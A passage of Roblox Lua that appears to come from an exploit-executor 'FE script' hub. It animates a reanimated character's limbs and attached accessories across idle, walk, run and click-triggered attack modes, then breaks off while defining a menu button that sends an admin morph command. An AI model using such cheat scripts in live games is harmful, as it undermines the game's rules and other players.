RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

Mode='1'

mousechanger=game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
if k == '1' then-- first mode
Mode='1'
reanim.Humanoid.WalkSpeed = 16
elseif k == 'e' then-- second mode
Mode='2'
elseif k == 'q' then-- first mode again
Mode='1'
reanim.Humanoid.WalkSpeed = 16
end
end)

attacklol=game.Players.LocalPlayer:GetMouse().Button1Down:Connect(function()
Mode='Attack1'
wait(1) -- time of attack u can edit this
Mode='Attack2'
wait(1)
Mode='Attack3'
wait(0.5)
Mode='Attack4'
wait(0.007)
Mode='Attack4'
wait(0.5)
Mode ='1' -- change this mode to whatever u want the mode to be after attacking
end)

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if Mode == '1' then
if Root.Velocity.y > 1 then -- jump

elseif Root.Velocity.y < -1 then -- fall

elseif Root.Velocity.Magnitude < 2 then -- idle
hat('Little Blue Flame','Torso',CFrame.new(0,0,0),CFrame.new(0+0*math["sin"](sine/0.1),-1.76+0*math["sin"](sine/0.1),-21.64+0*math["sin"](sine/0.1))*CFrame.Angles(math.rad(-90+0*math["sin"](sine/0.1)),math.rad(0+0*math["sin"](sine/0.1)),math.rad(0+0*math["sin"](sine/0.1))),false)
hat('Blue Soul Flame','Torso',CFrame.new(0,0,0),CFrame.new(0+0*math["cos"](sine/10),20.81+0*math["cos"](sine/10),0+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),false)
hat('Meshes/dragonblade_meshAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0+0*math["sin"](sine/10),0.93+0*math["sin"](sine/10),2.2+0*math["sin"](sine/10))*CFrame.Angles(math.rad(0+0*math["sin"](sine/10)),math.rad(0+0*math["sin"](sine/10)),math.rad(0+0*math["sin"](sine/10))),false)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.sin(sine/10),0.5+0.1*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(227.2+0*math.sin(sine/10)),math.rad(74.36+5*math.sin(sine/10)),math.rad(-24.98+5*math.sin(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+5*math.sin(sine/10)),math.rad(5.58+-5*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.sin(sine/10),-1+-0.1*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.sin(sine/10),-1+-0.1*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(-2.06+0*math.sin(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
hat('Meshes/dragonblade_meshAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0+0*math["sin"](sine/10),0.93+0*math["sin"](sine/10),2.2+0*math["sin"](sine/10))*CFrame.Angles(math.rad(-20+0*math["sin"](sine/10)),math.rad(0+0*math["sin"](sine/10)),math.rad(0+0*math["sin"](sine/10))),false)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(-9.7+5*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+30*math.sin(sine/10)),math.rad(0+5*math.sin(sine/10)),math.rad(5.58+0*math.sin(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+-30*math.sin(sine/10)),math.rad(5.58+-5*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.sin(sine/10),-1+-0.1*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+-30*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.sin(sine/10),-1+-0.1*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+30*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
hat('Meshes/dragonblade_meshAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0+0*math["sin"](sine/10),0.93+0*math["sin"](sine/10),2.2+0*math["sin"](sine/10))*CFrame.Angles(math.rad(-20+0*math["sin"](sine/10)),math.rad(0+0*math["sin"](sine/10)),math.rad(0+0*math["sin"](sine/10))),false)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(-9.7+5*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+30*math.sin(sine/10)),math.rad(0+5*math.sin(sine/10)),math.rad(5.58+0*math.sin(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+-30*math.sin(sine/10)),math.rad(5.58+-5*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.sin(sine/10),-1+-0.1*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+-30*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.sin(sine/10),-1+-0.1*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+30*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2)
end

elseif Mode == '2' then
reanim.Humanoid.WalkSpeed = 60
if Root.Velocity.y > 1 then -- jump
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),0.39+0.4*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(-9.7+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(5.58+5*math.sin(sine/10)),math.rad(0+5*math.sin(sine/10)),math.rad(13.23+5*math.sin(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(-32.62+5*math.sin(sine/10)),math.rad(0+5*math.sin(sine/10)),math.rad(-24.98+5*math.sin(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(-47.91+5*math.sin(sine/10)),math.rad(0+-5*math.sin(sine/10)),math.rad(13.23+-5*math.sin(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(-47.91+-5*math.sin(sine/10)),math.rad(0+5*math.sin(sine/10)),math.rad(-2.06+5*math.sin(sine/10))),.2)
elseif Root.Velocity.y < -1 then -- fall
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),0.39+0.4*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(20+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(5.58+5*math.sin(sine/10)),math.rad(0+5*math.sin(sine/10)),math.rad(13.23+5*math.sin(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(-32.62+5*math.sin(sine/10)),math.rad(0+5*math.sin(sine/10)),math.rad(-24.98+5*math.sin(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(-47.91+5*math.sin(sine/10)),math.rad(0+-5*math.sin(sine/10)),math.rad(13.23+-5*math.sin(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(-47.91+-5*math.sin(sine/10)),math.rad(0+5*math.sin(sine/10)),math.rad(-2.06+5*math.sin(sine/10))),.2)
elseif Root.Velocity.Magnitude < 2 then -- idle
hat('Little Blue Flame','Torso',CFrame.new(0,0,0),CFrame.new(0+0*math["sin"](sine/0.1),-1.76+0*math["sin"](sine/0.1),-21.64+0*math["sin"](sine/0.1))*CFrame.Angles(math.rad(-90+0*math["sin"](sine/0.1)),math.rad(0+0*math["sin"](sine/0.1)),math.rad(0+0*math["sin"](sine/0.1))),false)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-5*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),0+0.5*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(25.96+-10*math.cos(sine/10)),math.rad(-24.98+0*math.cos(sine/10)),math.rad(46.34+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.2*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-20+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-0.5+0*math.cos(sine/10),-0.75+0*math.cos(sine/10))*CFrame.Angles(math.rad(-20+10*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(5+7*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
hat('Little Blue Flame','Head',CFrame.new(0,0,0),CFrame.new(0+0*math["sin"](sine/0.1),-1.76+0*math["sin"](sine/0.1),0+0*math["sin"](sine/0.1))*CFrame.Angles(math.rad(-90+0*math["sin"](sine/0.1)),math.rad(0+0*math["sin"](sine/0.1)),math.rad(0+1280*math["sin"](sine/0.1))),false)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(70+-5*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),0+0.5*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-70+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(50+-10*math.cos(sine/10)),math.rad(-22.44+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1+0*math.cos(sine/10),0.5+0.2*math.cos(sine/10),-0.5+0*math.cos(sine/10))*CFrame.Angles(math.rad(143.14+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(41.25+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-0.5+0*math.cos(sine/10),-0.75+0*math.cos(sine/10))*CFrame.Angles(math.rad(-20+10*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-20+7*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
hat('Little Blue Flame','Head',CFrame.new(0,0,0),CFrame.new(0+0*math["sin"](sine/0.1),-1.76+0*math["sin"](sine/0.1),0+0*math["sin"](sine/0.1))*CFrame.Angles(math.rad(-90+0*math["sin"](sine/0.1)),math.rad(0+0*math["sin"](sine/0.1)),math.rad(0+1280*math["sin"](sine/0.1))),false)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(70+-5*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),0+0.5*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-70+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(50+-10*math.cos(sine/10)),math.rad(-22.44+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1+0*math.cos(sine/10),0.5+0.2*math.cos(sine/10),-0.5+0*math.cos(sine/10))*CFrame.Angles(math.rad(143.14+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(41.25+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-0.5+0*math.cos(sine/10),-0.75+0*math.cos(sine/10))*CFrame.Angles(math.rad(-20+10*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-20+7*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
end

elseif Mode == 'Attack1' then --attack clerp 
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(-47.91+0*math.sin(sine/10)),math.rad(74.36+0*math.sin(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),-0.2+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(13.23+0*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10))),.2)
elseif Mode == 'Attack2' then --attack clerp 
hat('Blue Soul Flame','Torso',CFrame.new(0,0,0),CFrame.new(0+0*math["sin"](sine/0.1),0+0*math["sin"](sine/0.1),5.23+0*math["sin"](sine/0.1))*CFrame.Angles(math.rad(0+0*math["sin"](sine/0.1)),math.rad(0+0*math["sin"](sine/0.1)),math.rad(0+1280*math["sin"](sine/0.1))),false)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),-0.68+0*math.sin(sine/10))*CFrame.Angles(math.rad(-2.06+0*math.sin(sine/10)),math.rad(112.57+0*math.sin(sine/10)),math.rad(74.36+0*math.sin(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),-0.2+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(13.23+0*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10))),.2)
elseif Mode == 'Attack3' then --attack clerp 
hat('Blue Soul Flame','Torso',CFrame.new(0,0,0),CFrame.new(0+0*math["sin"](sine/0.1),0+0*math["sin"](sine/0.1),20+0*math["sin"](sine/0.1))*CFrame.Angles(math.rad(0+0*math["sin"](sine/0.1)),math.rad(0+0*math["sin"](sine/0.1)),math.rad(0+1280*math["sin"](sine/0.1))),false)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(13.23+0*math.sin(sine/10)),math.rad(-17.34+0*math.sin(sine/10)),math.rad(74.36+0*math.sin(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),-0.2+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(13.23+0*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10))),.2)
elseif Mode == 'Attack4' then --attack clerp  
hat('Blue Soul Flame','Torso',CFrame.new(0,0,0),CFrame.new(0+0*math["sin"](sine/0.1),-0.14+0*math["sin"](sine/0.1),20+0*math["sin"](sine/0.1))*CFrame.Angles(math.rad(51.43+0*math["sin"](sine/0.1)),math.rad(0+0*math["sin"](sine/0.1)),math.rad(0+0*math["sin"](sine/0.1))),false)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(13.23+0*math.sin(sine/10)),math.rad(89.64+0*math.sin(sine/10)),math.rad(51.43+0*math.sin(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(66.72+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(28.51+0*math.sin(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),-0.2+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(13.23+0*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10))),.2)
elseif Mode == 'Attack5' then --attack clerp  
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(13.23+0*math.sin(sine/10)),math.rad(89.64+0*math.sin(sine/10)),math.rad(51.43+0*math.sin(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.sin(sine/10),0.5+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(66.72+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(-32.62+0*math.sin(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),-0.2+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10)),math.rad(0+0*math.sin(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.sin(sine/10),-1+0*math.sin(sine/10),0+0*math.sin(sine/10))*CFrame.Angles(math.rad(0+0*math.sin(sine/10)),math.rad(13.23+0*math.sin(sine/10)),math.rad(-9.7+0*math.sin(sine/10))),.2)
end
srv.RenderStepped:Wait()
end
end)()
end)



fescripts:addButton("BIG BOBS",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "Note";
        Text = "made by khlat and mkrm dacca ";
    })
    local r6 = {
        [1] = ";morph me DonaldTrump "
    }
    
